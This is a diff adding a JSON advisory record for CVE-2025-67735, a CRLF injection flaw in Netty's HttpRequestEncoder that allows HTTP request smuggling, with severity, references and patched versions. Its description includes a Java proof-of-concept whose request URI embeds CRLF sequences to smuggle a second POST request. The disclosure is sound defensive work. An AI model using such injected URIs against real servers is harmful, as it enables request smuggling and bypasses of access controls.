@@ -1,0 +1,59 @@
+{
+  "Severity": "MODERATE",
+  "UpdatedAt": "2025-12-15T23:28:50Z",
+  "Package": {
+    "Ecosystem": "MAVEN",
+    "Name": "io.netty:netty-codec-http"
+  },
+  "Advisory": {
+    "DatabaseId": 326603,
+    "Id": "GSA_kwCzR0hTQS04NGg3LXJqajMtNmp4NM4ABPvL",
+    "GhsaId": "GHSA-84h7-rjj3-6jx4",
+    "References": [
+      {
+        "Url": "https://github.com/netty/netty/security/advisories/GHSA-84h7-rjj3-6jx4"
+      },
+      {
+        "Url": "https://github.com/netty/netty/commit/77e81f1e5944d98b3acf887d3aa443b252752e94"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-84h7-rjj3-6jx4"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-84h7-rjj3-6jx4"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2025-67735"
+      }
+    ],
+    "Description": "### Summary\n\nThe `io.netty.handler.codec.http.HttpRequestEncoder` CRLF injection with the request uri when constructing a request. This leads to request smuggling when `HttpRequestEncoder` is used without proper sanitization of the uri.\n\n### Details\n\nThe `HttpRequestEncoder` simply UTF8 encodes the `uri` without sanitization (`buf.writeByte(SP).writeCharSequence(uriCharSequence, CharsetUtil.UTF_8);`)\n\nThe default implementation of HTTP headers guards against such possibility already with a validator making it impossible with headers.\n\n### PoC\n\nSimple reproducer:\n\n```java\npublic static void main(String[] args) {\n\n  EmbeddedChannel client = new EmbeddedChannel();\n  client.pipeline().addLast(new HttpClientCodec());\n\n  EmbeddedChannel server = new EmbeddedChannel();\n  server.pipeline().addLast(new HttpServerCodec());\n  server.pipeline().addLast(new ChannelInboundHandlerAdapter() {\n    @Override\n    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {\n      System.out.println(\"Processing msg \" + msg);\n    }\n  });\n\n  DefaultHttpRequest request = new DefaultHttpRequest(\n    HttpVersion.HTTP_1_1,\n    HttpMethod.GET,\n    \"/s1 HTTP/1.1\\r\\n\" +\n      \"\\r\\n\" +\n      \"POST /s2 HTTP/1.1\\r\\n\" +\n      \"content-length: 11\\r\\n\\r\\n\" +\n      \"Hello World\" +\n      \"GET /s1\"\n  );\n  client.writeAndFlush(request);\n  ByteBuf tmp;\n  while ((tmp = client.readOutbound()) != null) {\n    server.writeInbound(tmp);\n  }\n}\n```\n\n### Impact\n\nAny application / framework using `HttpRequestEncoder` can be subject to be abused to perform request smuggling using CRLF injection.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2025-12-15T23:28:49Z",
+    "Severity": "MODERATE",
+    "Summary": "Netty has a CRLF Injection vulnerability in io.netty.handler.codec.http.HttpRequestEncoder",
+    "UpdatedAt": "2025-12-15T23:28:50Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 6.5,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "4.1.129.Final"
+      },
+      "VulnerableVersionRange": "\u003c 4.1.129.Final"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "4.2.8.Final"
+      },
+      "VulnerableVersionRange": "\u003e= 4.2.0.Alpha1, \u003c 4.2.8.Final"
+    }
+  ]
+}
